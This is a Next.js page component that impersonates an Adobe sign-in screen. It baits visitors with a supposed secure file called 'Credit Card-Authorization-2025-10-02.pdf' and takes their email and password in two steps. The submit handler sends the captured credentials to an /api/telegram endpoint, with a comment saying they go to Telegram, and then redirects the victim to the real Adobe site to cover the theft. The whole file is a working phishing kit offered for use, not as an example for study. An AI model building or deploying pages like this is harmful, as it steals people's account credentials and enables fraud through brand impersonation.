"use client";

import { useState, FormEvent } from "react";
import Image from "next/image";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { FileText } from "lucide-react";

export default function HomePage() {
  const [email, setEmail] = useState("");
  const [step, setStep] = useState<"email" | "password">("email");
  const [password, setPassword] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleEmailSubmit = (e: FormEvent) => {
    e.preventDefault();
    setStep("password");
  };

  const handlePasswordSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      // Send credentials to Telegram
      await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });
    } catch (error) {
      console.error("Error sending data:", error);
    } finally {
      // Redirect regardless of success/failure
      window.location.href = "https://www.adobe.com/";
    }
  };

  return (
    <div className="min-h-screen bg-[#E5E5E5] flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg w-full max-w-[400px] p-8">
        {/* Adobe Logo */}
        <div className="flex justify-center mb-8">
          <Image
            src="https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/object/public/test-clones/24a2c4e9-a79a-4cc9-ab49-7943b561b083-adobe-com/assets/svgs/adobe-logo-1.svg"
            alt="Adobe"
            width={60}
            height={54}
            className="w-[60px] h-auto"
          />
        </div>

        {step === "email" ? (
          <>
            {/* Heading */}
            <h1 className="text-2xl font-bold text-[#2C2F36] text-center mb-6">
              Verify your Identity
            </h1>

            {/* Description */}
            <p className="text-sm text-[#2C2F36] mb-6 leading-relaxed">
              To view this secure file, enter the recipient&apos;s email for private access.
            </p>

            {/* Document Name */}
            <div className="flex items-start gap-2 mb-6 p-3 bg-[#FFF5F5] rounded">
              <FileText className="w-5 h-5 text-[#FF0000] flex-shrink-0 mt-0.5" />
              <span className="text-sm text-[#2C2F36]">
                Credit Card-Authorization-2025-10-02.pdf
              </span>
            </div>

            {/* Email Form */}
            <form onSubmit={handleEmailSubmit} className="space-y-4">
              <div className="grid w-full items-center gap-2">
                <Label htmlFor="email" className="text-sm text-[#6E6E6E] font-normal">
                  E-mail
                </Label>
                <Input
                  type="email"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="h-11 rounded border border-[#D1D1D1] focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-[#1473E6] bg-white text-[#2C2F36]"
                  autoComplete="email"
                />
              </div>

              <Button
                type="submit"
                className="w-full bg-[#5B9BD5] hover:bg-[#4A8BC2] rounded h-11 text-base font-normal text-white"
              >
                Next
              </Button>
            </form>

            {/* Help Link */}
            <div className="mt-6 text-center">
              <a href="#" className="text-sm text-[#1473E6] hover:underline">
                Get help signing in ?
              </a>
            </div>
          </>
        ) : (
          <>
            {/* Password Step */}
            <h1 className="text-2xl font-bold text-[#2C2F36] text-center mb-6">
              Sign in
            </h1>

            <p className="text-sm text-[#2C2F36] mb-6 text-center">
              {email}
            </p>

            <form onSubmit={handlePasswordSubmit} className="space-y-4">
              <div className="grid w-full items-center gap-2">
                <Label htmlFor="password" className="text-sm text-[#6E6E6E] font-normal">
                  Password
                </Label>
                <Input
                  type="password"
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="h-11 rounded border border-[#D1D1D1] focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-[#1473E6] bg-white text-[#2C2F36]"
                  autoComplete="current-password"
                />
              </div>

              <Button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#5B9BD5] hover:bg-[#4A8BC2] rounded h-11 text-base font-normal text-white disabled:opacity-50"
              >
                {isSubmitting ? "Processing..." : "Continue"}
              </Button>
            </form>

            <div className="mt-6 text-center">
              <button
                onClick={() => setStep("email")}
                className="text-sm text-[#1473E6] hover:underline"
              >
                Back
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}